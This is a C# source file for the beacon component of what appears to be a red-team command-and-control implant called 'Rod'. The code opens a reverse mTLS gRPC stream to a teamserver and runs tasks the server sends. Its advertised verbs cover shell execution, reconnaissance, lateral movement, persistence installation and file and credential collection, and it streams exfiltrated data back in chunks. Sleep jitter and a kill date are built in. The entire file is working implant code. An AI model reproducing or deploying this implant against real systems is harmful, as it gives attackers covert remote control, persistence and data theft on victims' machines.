using System.Net.Security;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Google.Protobuf;
using Grpc.Core;
using Grpc.Net.Client;
using Rod.V1;
// The generated gRPC client lives in Rod.V1.Beacon (a static client factory
// class with the nested BeaconClient). This class is also named Beacon, so alias
// the generated one to avoid the name clash.
using WireBeacon = Rod.V1.Beacon;

namespace Rod.Implant.Internal;

// The reference implant's mTLS check-in client: it opens the long-lived reverse
// Beacon.CheckIn stream, completes the handshake, and then loops reading
// downstream tasking and writing upstream results (architecture.md Sec 5/8,
// Sec 10.3). The stream is bidirectional frames whose payloads are the rod.v1
// handshake/task/result messages. Mirrors the Go implant's beacon package.

/// <summary>
/// Runs the implant's check-in lifecycle against the teamserver: dial the mTLS
/// endpoint, complete the handshake, then loop dispatching downstream tasks and
/// reporting upstream results. Blocks until the cancellation token fires or the
/// baked-in kill date passes. The cadence follows the baked-in sleep + jitter
/// profile.
/// </summary>
internal sealed class Beacon
{
    // The capability verbs the reference implant advertises at handshake
    // (architecture.md Sec 10). The teamserver gates dispatch on these: the core
    // shell verb, the three recon verbs the runner implements, the lateral
    // verbs (move for child derivation; token and exec_remote for the standard
    // access-token and remote-execution surfaces per ADR 0004), the persist
    // verbs (install/remove/list for the documented Run/schtasks/service/cron/
    // systemd mechanisms per ADR 0004), and the collect verbs (file for
    // filesystem reads with chunked-streaming for large files; cred for
    // standard credential-store enumeration without dumping secret material).
    private static readonly string[] Caps =
    {
        "shell.exec",
        "recon.portscan",
        "recon.hostenum",
        "recon.service",
        "lateral.move",
        "lateral.token",
        "lateral.exec_remote",
        "persist.install",
        "persist.remove",
        "persist.list",
        "collect.file",
        "collect.cred",
    };

    private readonly string _beaconUrl;
    private readonly string _implantId;
    private readonly X509Certificate2 _leaf;
    private readonly RSA _privateKey;
    private readonly IReadOnlyList<X509Certificate2> _cas;
    private readonly TimeSpan _sleep;
    private readonly TimeSpan _jitter;
    private readonly DateTimeOffset? _killDate;
    private readonly Runner _runner;
    private readonly TextWriter _log;

    public Beacon(string beaconUrl, string implantId, X509Certificate2 leaf, RSA privateKey,
        IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
        TextWriter log)
        : this(beaconUrl, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll: null, log)
    {
    }

    /// <summary>
    /// Builds a Beacon whose lateral.move handler can derive a child using
    /// <paramref name="enroll"/> (architecture.md Sec 10.1). A null bundle leaves
    /// derivation disabled and the runner behaves as the simpler constructor.
    /// </summary>
    public Beacon(string beaconUrl, string implantId, X509Certificate2 leaf, RSA privateKey,
        IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
        EnrollBundle? enroll, TextWriter log)
    {
        _beaconUrl = beaconUrl;
        _implantId = implantId;
        _leaf = leaf;
        _privateKey = privateKey;
        _cas = cas;
        _sleep = sleep;
        _jitter = jitter;
        _killDate = killDate;
        _runner = enroll is null ? new Runner() : new Runner(enroll);
        _log = log;
    }

    /// <summary>
    /// Blocks until cancellation or the kill date passing. Reconnects after a
    /// jittered sleep when the stream drops (implants are connection initiators;
    /// flapping is expected and handled by reconnecting, architecture.md Sec 8).
    /// The kill date is checked at the top of each cycle so a long-running implant
    /// self-terminates once it passes, not only on the next restart
    /// (architecture.md Sec 7).
    /// </summary>
    public async Task RunAsync(CancellationToken cancellationToken)
    {
        while (!cancellationToken.IsCancellationRequested)
        {
            if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
            {
                _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
                return;
            }
            try
            {
                await RunOnceAsync(cancellationToken);
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch (RpcException ex)
            {
                _log.WriteLine($"beacon stream ended: {ex.Status.Detail}");
            }
            catch (Exception ex)
            {
                _log.WriteLine($"beacon stream ended: {ex.Message}");
            }
            try
            {
                await SleepWithJitterAsync(cancellationToken);
            }
            catch (OperationCanceledException)
            {
                return;
            }
        }
    }

    // One connect-handshake-task cycle. Returns when the stream ends (clean close,
    // transport error, or handshake refusal -- the caller logs and reconnects).
    private async Task RunOnceAsync(CancellationToken cancellationToken)
    {
        using var handler = new SocketsHttpHandler();
        var pinned = new X509Certificate2Collection();
        foreach (var ca in _cas)
            pinned.Add(ca);
        handler.SslOptions = new SslClientAuthenticationOptions
        {
            ClientCertificates = new X509Certificate2Collection(_leaf),
            RemoteCertificateValidationCallback = (_, cert, chain, errors) =>
                PinServerChain(cert, chain, pinned),
        };

        // grpc-dotnet takes the channel address; HTTPS transport security comes
        // from the SocketsHttpHandler's SslOptions. The beacon URL may be passed
        // as "host:port" (no scheme); prepend https:// so the channel builder
        // accepts it. Mirrors the Go client's grpcTarget normalization.
        var address = GrpcAddress(_beaconUrl);
        using var channel = GrpcChannel.ForAddress(address, new GrpcChannelOptions
        {
            HttpHandler = handler,
        });

        var client = new WireBeacon.BeaconClient(channel);
        using var call = client.CheckIn(cancellationToken: cancellationToken);

        // The implant speaks first: handshake with its protocol version and identity.
        var handshake = new HandshakeRequest
        {
            Version = new ProtocolVersion { Major = 1, Minor = 0 },
            ImplantId = _implantId,
        };
        handshake.Capabilities.Add(Caps);
        await call.RequestStream.WriteAsync(new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) });

        if (!await call.ResponseStream.MoveNext(cancellationToken))
            throw new RpcException(new Status(StatusCode.Unavailable, "handshake: stream closed"));
        var hs = HandshakeResponse.Parser.ParseFrom(call.ResponseStream.Current.Payload);
        if (hs.Status != HandshakeStatus.Ok)
            throw new RpcException(new Status(StatusCode.PermissionDenied, $"handshake refused: {hs.Status}"));
        _log.WriteLine($"handshake ok: engagement={hs.EngagementId}");

        // Tasking loop: read TaskRequest downstream, dispatch, write TaskResult up.
        while (await call.ResponseStream.MoveNext(cancellationToken))
        {
            var frame = call.ResponseStream.Current;
            var task = TaskRequest.Parser.ParseFrom(frame.Payload);
            var (outcome, output, chunks) = _runner.Dispatch(task.Verb, task.Arguments);
            var result = new TaskResult
            {
                TaskId = task.TaskId,
                Outcome = outcome,
                Output = output,
            };
            await call.RequestStream.WriteAsync(new Frame
            {
                Payload = ByteString.CopyFrom(result.ToByteArray()),
                Kind = FrameKind.TaskResult,
            });

            // Out-of-band exfil chunks follow the TaskResult on the same stream.
            // Each carries the task id so the server reassembles and routes them
            // to the artifact store (architecture.md Sec 10.1 exfil, Sec 11).
            foreach (var chunk in chunks)
            {
                chunk.TaskId = task.TaskId;
                await call.RequestStream.WriteAsync(new Frame
                {
                    Payload = ByteString.CopyFrom(chunk.ToByteArray()),
                    Kind = FrameKind.ExfilChunk,
                });
            }
        }
    }

    // Sleeps for the base interval +/- jitter/2, honoring cancellation.
    private async Task SleepWithJitterAsync(CancellationToken cancellationToken)
    {
        var d = _sleep;
        if (_jitter > TimeSpan.Zero)
        {
            var deltaTicks = (long)(Random.Shared.NextDouble() * _jitter.Ticks) - _jitter.Ticks / 2;
            d = d + TimeSpan.FromTicks(deltaTicks);
        }
        if (d < TimeSpan.Zero)
            d = TimeSpan.Zero;
        await Task.Delay(d, cancellationToken);
    }

    // Normalizes the beacon URL into the form GrpcChannel.ForAddress expects: a
    // scheme is required, so "host:port" becomes "https://host:port". Any trailing
    // path is dropped -- gRPC uses the :authority, not a path.
    private static string GrpcAddress(string beaconUrl)
    {
        var u = beaconUrl.Trim();
        if (u.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
            u = u["https://".Length..];
        else if (u.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
            u = u["http://".Length..];
        var slash = u.IndexOf('/');
        if (slash >= 0)
            u = u[..slash];
        return $"https://{u}";
    }

    // Accepts the peer certificate iff it chains to one of the pinned CAs. The
    // dev teamserver presents the CA certificate itself as its server identity
    // (TransportHost.ConfigureMtlsHttps), and that CA cert carries no Subject
    // Alternative Names -- standard name verification would reject it. The
    // implant pins the CA explicitly, so the security property is
    // chain-to-pinned-CA, not DNS name match -- the same shape the C# server side
    // uses (ClientCertificateChainsToCa) and the Go implant uses
    // (verifyChain). Mirrored here for the implant's side of the stream.
    private static bool PinServerChain(
        object? certificate,
        X509Chain? chain,
        X509Certificate2Collection pinned)
    {
        if (certificate is not X509Certificate2 cert || chain is null)
            return false;
        chain.ChainPolicy.RevocationMode = X509RevocationMode.NoCheck;
        chain.ChainPolicy.VerificationFlags = X509VerificationFlags.AllowUnknownCertificateAuthority;
        foreach (X509Certificate2 ca in pinned)
            chain.ChainPolicy.ExtraStore.Add(ca);
        if (!chain.Build(cert))
            return false;
        if (chain.ChainElements.Count == 0)
            return false;
        var root = chain.ChainElements[^1].Certificate;
        foreach (X509Certificate2 ca in pinned)
            if (root.Thumbprint == ca.Thumbprint)
                return true;
        return false;
    }
}
